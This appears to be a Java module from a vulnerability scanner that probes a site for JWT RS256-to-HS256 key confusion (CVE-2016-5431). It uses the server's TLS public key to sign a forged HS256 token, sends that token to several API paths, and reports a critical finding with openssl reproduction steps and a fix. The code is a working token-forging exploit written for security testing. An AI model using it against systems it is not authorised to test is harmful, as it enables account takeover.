package gg.effront.anarcry.scanner.crypto.jwt;

import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.TlsUtil;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.SSLSocket;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.cert.Certificate;
import java.security.cert.X509Certificate;
import java.time.Duration;
import java.util.Base64;
import java.util.List;
import java.util.Optional;
import java.util.function.Consumer;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.CvssCalculator;

public class Rs256Hs256Probe {

    private static final List<String> AUTH_PATHS = List.of("/api/me", "/api/user", "/api/profile");

    public Optional<Finding> probe(String[] parts, ScanContext ctx, String base, HttpClient hc, Consumer<String> log) {
        if (!ctx.isHttps()) {
            log.accept("[~] JWT: RS256→HS256 — requer HTTPS para extrair chave pública, pulando");
            return Optional.empty();
        }
        log.accept("[~] JWT: probe RS256→HS256 key confusion (CVE-2016-5431) → " + ctx.host());
        try {
            SSLSocket socket = TlsUtil.connectSocket(ctx.host(), ctx.port(),
                    TlsUtil.sslContext(TlsUtil.trustAll()), 8000);
            socket.startHandshake();
            Certificate[] certs = socket.getSession().getPeerCertificates();
            socket.close();

            if (certs.length == 0) {
                log.accept("[~] JWT: RS256→HS256 — nenhum cert TLS obtido");
                return Optional.empty();
            }

            X509Certificate cert = (X509Certificate) certs[0];
            byte[] derKey = cert.getPublicKey().getEncoded();
            // PEM-encoded SubjectPublicKeyInfo — used as HMAC secret to mimic server's confusion
            String b64Key  = Base64.getMimeEncoder(64, new byte[]{'\n'}).encodeToString(derKey);
            String pemKey  = "-----BEGIN PUBLIC KEY-----\n" + b64Key + "\n-----END PUBLIC KEY-----\n";
            byte[] keyBytes = pemKey.getBytes(StandardCharsets.UTF_8);

            String forgedHeader = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString("{\"alg\":\"HS256\",\"typ\":\"JWT\"}".getBytes(StandardCharsets.UTF_8));
            String sigInput = forgedHeader + "." + parts[1];

            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(keyBytes, "HmacSHA256"));
            String forgedToken = sigInput + "." + Base64.getUrlEncoder().withoutPadding()
                    .encodeToString(mac.doFinal(sigInput.getBytes(StandardCharsets.UTF_8)));

            log.accept("[~] JWT: RS256→HS256 token forjado, enviando probes");
            for (String path : AUTH_PATHS) {
                try {
                    HttpRequest req = HttpRequest.newBuilder()
                            .uri(URI.create(base + path))
                            .header("Authorization", "Bearer " + forgedToken)
                            .timeout(Duration.ofSeconds(5))
                            .GET().build();
                    HttpResponse<Void> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), "JWT");
                    log.accept("[~] JWT: RS256→HS256 " + path + " → HTTP " + resp.statusCode());
                    if (resp.statusCode() == 200) {
                        String _cweId = CweRegistry.cweId("JWT");
                        String _cweTitle = CweRegistry.cweTitle("JWT");
                        String _cvssVector = CweRegistry.cvssVector("JWT");
                        double _score = CvssCalculator.calculate(_cvssVector);
                        return Optional.of(Finding.of("JWT", base + path,
                                "RS256→HS256 key confusion aceita ativamente (CVE-2016-5431)", Severity.CRITICAL,
                                "Probe em " + base + path + " → HTTP 200 com token HS256 assinado via chave pública TLS",
                                "Servidor usa a chave pública RSA como segredo HMAC — qualquer um com acesso à chave pública pode forjar tokens",
                                "# 1. Extrair chave pública:\nopenssl s_client -connect " + ctx.host() + ":" + ctx.port() +
                                " | openssl x509 -pubkey -noout > pub.pem\n" +
                                "# 2. Assinar token HS256 com pub.pem como segredo",
                                "Validar explicitamente o algoritmo esperado no servidor; rejeitar tokens com alg diferente do configurado",
                                _cweId, _cweTitle, _cvssVector, _score));
                    }
                } catch (Exception e) {
                    log.accept("[~] JWT: RS256→HS256 " + path + " — " + e.getMessage());
                }
            }
        } catch (Exception e) {
            log.accept("[~] JWT: RS256→HS256 — " + e.getMessage());
        }
        return Optional.empty();
    }
}
